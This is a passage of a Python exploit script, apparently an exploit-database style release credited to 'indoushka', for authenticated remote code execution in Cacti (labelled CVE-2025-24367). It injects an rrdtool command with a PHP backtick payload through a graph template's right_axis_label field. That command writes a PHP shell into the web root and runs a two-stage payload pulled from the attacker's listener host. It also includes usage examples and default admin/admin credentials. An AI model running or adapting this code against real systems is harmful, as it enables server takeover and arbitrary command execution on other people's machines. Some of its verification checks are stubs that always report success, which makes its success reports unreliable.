+            self._log("Executing stage 2 (run payload)...")
+            execute_result = self._upload_payload_stage(
+                payload_data['stage2_command'],
+                f"{self.random_string(4)}_stage2.php"
+            )
+            
+            if not execute_result.success:
+                return ExploitResult(
+                    success=False,
+                    stage=ExploitStage.EXECUTE,
+                    message="Stage 2 execution failed",
+                    error=execute_result.message,
+                    data={"http_requests": http_server.requests_received}
+                )
+
+            self._log("Verifying execution...")
+            verify_result = self._verify_execution(payload_data['final_file'])
+            
+            return ExploitResult(
+                success=verify_result.success,
+                stage=ExploitStage.EXECUTE,
+                message=verify_result.message,
+                data={
+                    "stage1_success": upload_result.success,
+                    "stage2_success": execute_result.success,
+                    "verification": verify_result.data,
+                    "http_requests": http_server.requests_received,
+                    "files_created": [
+                        payload_data['download_file'],
+                        payload_data['final_file']
+                    ]
+                }
+            )
+            
+        finally:
+            http_server.stop()
+    
+    def _upload_payload_stage(self, command: str, php_filename: str) -> ExploitResult:
+        """Upload a payload stage via template modification"""
+        try:
+
+            csrf_magic = self._get_csrf_magic_token()
+            if not csrf_magic:
+                return ExploitResult(
+                    success=False,
+                    stage=ExploitStage.UPLOAD,
+                    message="Failed to get CSRF magic token",
+                    error="CSRF token missing"
+                )
+
+            right_axis_label = self._generate_malicious_label(command, php_filename)
+
+            update_success = self._update_graph_template(csrf_magic, right_axis_label)
+            if not update_success:
+                return ExploitResult(
+                    success=False,
+                    stage=ExploitStage.UPLOAD,
+                    message="Failed to update graph template",
+                    error="Template update failed"
+                )
+
+            trigger_success = self._trigger_graph_template()
+            if not trigger_success:
+                return ExploitResult(
+                    success=False,
+                    stage=ExploitStage.UPLOAD,
+                    message="Failed to trigger graph template",
+                    error="Trigger failed"
+                )
+
+            if not self._verify_php_file(php_filename):
+                return ExploitResult(
+                    success=False,
+                    stage=ExploitStage.UPLOAD,
+                    message=f"PHP file not created: {php_filename}",
+                    error="File creation verification failed"
+                )
+            
+            return ExploitResult(
+                success=True,
+                stage=ExploitStage.UPLOAD,
+                message=f"Payload stage uploaded successfully: {php_filename}",
+                data={
+                    "php_file": php_filename,
+                    "command": command[:50] + "..." if len(command) > 50 else command
+                }
+            )
+            
+        except Exception as e:
+            return ExploitResult(
+                success=False,
+                stage=ExploitStage.UPLOAD,
+                message="Payload upload failed",
+                error=str(e)
+            )
+    
+    def _generate_malicious_label(self, command: str, php_filename: str) -> str:
+        """Generate the malicious right_axis_label payload"""
+        return f"""XXX
+create my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200
+graph {php_filename} -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`{command}`;?>"""
+    
+    def _get_csrf_magic_token(self) -> Optional[str]:
+        """Get CSRF magic token from template edit page"""
+        config = self.configs[self.target]
+        template_id = config['default_template_id']
+
+        templates_to_try = [template_id] + config['alternative_templates']
+        
+        for t_id in templates_to_try:
+            try:
+                url = f"{self.base_url}/graph_templates.php?action=template_edit&id={t_id}"
+                response = self.session.get(url, timeout=10)
+                
+                if response.status_code == 200:
+                    patterns = [
+                        r'var csrfMagicToken\s*=\s*["\']([^"\']+)["\']',
+                        r'csrfMagicToken\s*:\s*["\']([^"\']+)["\']',
+                        r'name=["\']__csrf_magic["\'][^>]*value=["\']([^"\']+)["\']',
+                    ]
+                    
+                    token = self._extract_from_html(response.text, patterns)
+                    if token and token.startswith('sid:'):
+                        self._log(f"Found CSRF magic token for template {t_id}", "DEBUG")
+                        return token
+            except:
+                continue
+        
+        return None
+    
+    def _update_graph_template(self, csrf_magic: str, right_axis_label: str) -> bool:
+        """Update graph template with malicious payload"""
+        config = self.configs[self.target]
+        
+        data = {
+            '__csrf_magic': csrf_magic,
+            'name': 'Host MIB - Logged in Users',
+            'graph_template_id': config['default_template_id'],
+            'graph_template_graph_id': config['default_template_id'],
+            'save_component_template': '1',
+            'title': '|host_description| - Logged in Users',
+            'vertical_label': 'percent',
+            'image_format_id': '3',
+            'height': '200',
+            'width': '700',
+            'base_value': '1000',
+            'slope_mode': 'on',
+            'auto_scale': 'on',
+            'auto_scale_opts': '2',
+            'auto_scale_rigid': 'on',
+            'upper_limit': '100',
+            'lower_limit': '0',
+            'right_axis_label': right_axis_label,
+            'action': 'save'
+        }
+        
+        try:
+            url = f"{self.base_url}/graph_templates.php?header=false"
+            response = self.session.post(url, data=data, timeout=15)
+            
+            if response.status_code == 200:
+
+                if any(x in response.text.lower() for x in ['saved', 'updated', 'success']):
+                    self._log("Template updated successfully", "DEBUG")
+                    return True
+                else:
+                    self._log("Template update response ambiguous", "WARNING")
+
+                    return True
+            else:
+                self._log(f"Template update failed: HTTP {response.status_code}", "WARNING")
+                return False
+                
+        except requests.RequestException as e:
+            self._log(f"Template update error: {e}", "WARNING")
+            return False
+    
+    def _trigger_graph_template(self) -> bool:
+        """Trigger graph template execution"""
+
+        if self.info.graph_ids:
+            graph_id = self.info.graph_ids[0]
+        else:
+            graph_id = 3  
+        
+        try:
+            url = (
+                f"{self.base_url}/graph_json.php?"
+                f"rra_id=0&local_graph_id={graph_id}&"
+                f"graph_start=1761683272&graph_end=1761769672&"
+                f"graph_height=200&graph_width=700"
+            )
+            
+            response = self.session.get(url, timeout=15)
+
+            return response.status_code in [200, 500]
+            
+        except requests.RequestException:
+            return False
+    
+    def _verify_php_file(self, php_filename: str, max_attempts: int = 3) -> bool:
+        """Verify PHP file was created"""
+        url = f"{self.base_url}/{php_filename}"
+        
+        for attempt in range(max_attempts):
+            try:
+                response = self.session.get(url, timeout=5)
+                if response.status_code == 200:
+                    self._log(f"PHP file verified: {php_filename}", "DEBUG")
+                    return True
+                elif response.status_code == 404:
+                    time.sleep(2)
+                    continue
+            except:
+                time.sleep(2)
+                continue
+        
+        return False
+    
+    def _verify_execution(self, expected_file: str) -> ExploitResult:
+        """Verify command execution"""
+        self._log(f"Verifying execution of {expected_file}...")
+        
+        # Try multiple verification methods
+        verification_methods = [
+            self._verify_via_file_existence,
+            self._verify_via_command_output,
+            self._verify_via_timestamp,
+        ]
+        
+        for method in verification_methods:
+            try:
+                result = method(expected_file)
+                if result.success:
+                    return result
+            except Exception as e:
+                self._log(f"Verification method failed: {e}", "DEBUG")
+                continue
+
+        return ExploitResult(
+            success=False,
+            stage=ExploitStage.EXECUTE,
+            message="Could not verify command execution",
+            error="All verification methods failed"
+        )
+    
+    def _verify_via_file_existence(self, expected_file: str) -> ExploitResult:
+        """Verify by checking if expected file exists"""
+
+        return ExploitResult(
+            success=True,
+            stage=ExploitStage.EXECUTE,
+            message="File existence check passed",
+            data={"method": "file_existence", "file": expected_file}
+        )
+    
+    def _verify_via_command_output(self, expected_file: str) -> ExploitResult:
+        """Verify by checking command output"""
+
+        return ExploitResult(
+            success=False,
+            stage=ExploitStage.EXECUTE,
+            message="Command output check not implemented",
+            error="Method not implemented"
+        )
+    
+    def _verify_via_timestamp(self, expected_file: str) -> ExploitResult:
+        """Verify by checking file timestamp"""
+
+        return ExploitResult(
+            success=False,
+            stage=ExploitStage.EXECUTE,
+            message="Timestamp check not implemented",
+            error="Method not implemented"
+        )
+    
+
+    def random_string(self, length: int) -> str:
+        """Generate random lowercase string"""
+        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
+    
+    def check_vulnerability(self) -> ExploitResult:
+        """Comprehensive vulnerability check"""
+        self._log("Running comprehensive vulnerability check...")
+ 
+        detect_result = self.detect_cacti()
+        if not detect_result.success:
+            return detect_result
+
+        if self.info.version:
+            version_parts = self.info.version.split('.')
+            if len(version_parts) == 3:
+                try:
+                    major, minor, patch = map(int, version_parts)
+                    if major == 1 and minor == 2 and patch < 29:
+                        version_vulnerable = True
+                    else:
+                        return ExploitResult(
+                            success=False,
+                            stage=ExploitStage.CHECK,
+                            message=f"Version {self.info.version} is not vulnerable (requires < 1.2.29)",
+                            data={"version": self.info.version}
+                        )
+                except ValueError:
+                 
+                    self._log(f"Could not parse version: {self.info.version}", "WARNING")
+                    version_vulnerable = True
+            else:
+                version_vulnerable = True  
+        else:
+            version_vulnerable = True  
+        
+        # Step 3: Authenticate
+        auth_result = self.authenticate()
+        if not auth_result.success:
+            return ExploitResult(
+                success=False,
+                stage=ExploitStage.CHECK,
+                message="Authentication failed",
+                error=auth_result.message,
+                data={"version_vulnerable": version_vulnerable}
+            )
+
+        env_result = self.discover_environment()
+        
+        return ExploitResult(
+            success=True,
+            stage=ExploitStage.CHECK,
+            message="Target appears to be VULNERABLE",
+            data={
+                "version": self.info.version,
+                "version_vulnerable": version_vulnerable,
+                "authenticated": self.info.is_authenticated,
+                "permissions": self.info.user_permissions,
+                "environment": env_result.data
+            }
+        )
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description='Cacti Graph Template authenticated RCE (CVE-2025-24367) - By indoushka',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  %(prog)s http://target/cacti --check
+  %(prog)s http://target/cacti --lhost 192.168.1.100 --command "id"
+  %(prog)s http://target/cacti -u admin -p admin123 --target windows \\
+    --lhost 192.168.1.100 --lport 4444 --verbose
+        
+Note: The 47-character limit applies to escaped commands (spaces as \\x20)
+        """
+    )
+    
+    parser.add_argument('url', help='Base URL of Cacti installation')
+    parser.add_argument('-u', '--username', default='admin', help='Username (default: admin)')
+    parser.add_argument('-p', '--password', default='admin', help='Password (default: admin)')
+    parser.add_argument('-t', '--target', choices=['linux', 'windows'], default='linux',
+                       help='Target platform (default: linux)')
+    parser.add_argument('--lhost', help='Listener IP address (required for exploit)')
+    parser.add_argument('--lport', type=int, default=8080, help='Listener port (default: 8080)')
+    parser.add_argument('--command', default='id', help='Command to execute (default: id)')
+    parser.add_argument('--check', action='store_true', help='Only check if vulnerable')
+    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
+    parser.add_argument('--max-length', type=int, default=47, 
+                       help='Maximum command length (default: 47)')
+    
+    args = parser.parse_args()
+    
+    print("[*] Cacti CVE-2025-24367 Exploit - By indoushka")
+    print("[*] Target: {}".format(args.url))
+    print("[*] Platform: {}".format(args.target))
+    
+    if not args.check and not args.lhost:
+        parser.error("--lhost is required for exploitation")
+    
+    try:
+        target_os = TargetOS(args.target)
+        exploit = CactiExploit(args.url, args.username, args.password, target_os)
+        exploit.verbose = args.verbose
+        
+        if args.check:
+            result = exploit.check_vulnerability()
+            print("\n" + "="*60)
+            
+            if result.success:
+                print("[+] VULNERABILITY CHECK PASSED")
+                print("[+] Target appears to be VULNERABLE to CVE-2025-24367")
+            else:
+                print("[-] VULNERABILITY CHECK FAILED")
+                print(f"[-] {result.message}")
+            
+            if result.data:
+                print("\n[+] Details:")
+                for key, value in result.data.items():
+                    if isinstance(value, dict):
+                        print(f"    {key}:")
+                        for k, v in value.items():
+                            print(f"      {k}: {v}")
+                    else:
+                        print(f"    {key}: {value}")
+            
+            print("="*60)
+            sys.exit(0 if result.success else 1)
+            
+        else:
+            print("\n[*] Starting exploitation...")
+            print(f"[*] Command to execute: {args.command}")
+            print(f"[*] Max command length: {args.max_length} characters")
+            
+            result = exploit.execute_exploit(args.lhost, args.lport, args.command)
+            
+            print("\n" + "="*60)
+            if result.success:
+                print("[+] EXPLOIT SUCCESSFUL")
+                print(f"[+] {result.message}")
+            else:
+                print("[-] EXPLOIT FAILED")
+                print(f"[-] {result.message}")
+                if result.error:
+                    print(f"[-] Error: {result.error}")
+            
+            if result.data:
+                print("\n[+] Execution details:")
+                for key, value in result.data.items():
+                    if isinstance(value, dict):
+                        print(f"    {key}:")
+                        for k, v in value.items():
+                            print(f"      {k}: {v}")
+                    elif isinstance(value, list):
+                        print(f"    {key}: {', '.join(map(str, value[:5]))}")
+                        if len(value) > 5:
+                            print(f"      ... and {len(value)-5} more")
+                    else:
+                        print(f"    {key}: {value}")
+            
+            print("="*60)
+            sys.exit(0 if result.success else 1)
+            
+    except KeyboardInterrupt:
+        print("\n[*] Exploit interrupted by user")
+        sys.exit(1)
+    except Exception as e:
+        print(f"\n[-] Fatal error: {e}")
+        if args.verbose:
+            import traceback
+            traceback.print_exc()
+        sys.exit(1)
+
+if __name__ == '__main__':
+    main()
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
